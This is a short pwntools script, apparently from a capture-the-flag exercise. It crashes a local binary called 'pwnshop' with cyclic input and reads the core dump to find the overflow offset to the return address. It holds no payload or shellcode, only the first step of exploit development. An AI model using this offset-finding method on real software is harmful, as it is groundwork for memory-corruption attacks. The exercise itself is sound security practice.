
from pwn import *

context(os='linux', arch='amd64')

executable = '/home/kali/Downloads/pwnshop'

buy_padding = 72

#elf = context.binary = ELF(executable)

log.info('Get Addresses')

#info("%s symbols", elf.symbols)
#info("%s plt", elf.plt)
#info("%s got", elf.got)
#info("%s libs", elf.libs)


log.info('Create IO')
#io = remote('', )
io = process(executable)

log.info('Send Command')
io.sendlineafter('>', '2')

payload = cyclic(32)

log.info('Send Payload')
io.sendlineafter('? ', payload)
io.sendlineafter('? ', payload)
io.sendlineafter('? ', payload)

io.wait()

core = io.corefile
stack = core.rsp
info("rsp = %#x", stack)
pattern = core.read(stack, 4)
info("cyclic pattern = %s", pattern.decode())
rip_offset = cyclic_find(pattern)
info("rip offset is = %d", rip_offset)

io.interactive()

